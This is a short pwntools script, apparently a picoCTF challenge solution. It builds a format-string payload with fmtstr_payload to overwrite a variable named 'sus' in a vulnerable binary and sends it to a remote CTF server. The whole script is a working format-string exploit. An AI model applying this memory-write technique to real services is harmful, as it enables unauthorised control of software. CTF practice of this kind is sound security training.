from pwn import *

fmt_str_offset: int
sus_addr: int
value_to_write: int
payload: str

fmt_str_offset = int(input("At what offset do you start reading your format string?\t"))
sus_addr = int(input("What is the address of sus?\t"), 16)
value_to_write = int(input("What value are you writing to sus?\t"), 16)

context.binary = './vuln'
#conn = process('./vuln')
conn = remote('rhea.picoctf.net', 53794)
print(conn.recv().decode("utf-8"))

payload = fmtstr_payload(fmt_str_offset, {sus_addr: value_to_write}, write_size='byte')
print("This is your payload: \n")
print(payload)
print("Sending Payload...\n")
conn.sendline(payload)

print("Result:\n")
print(conn.recvall().decode("utf-8"))

conn.close()

"vuln_script.py" 27L, 700B                                                           1,17          All
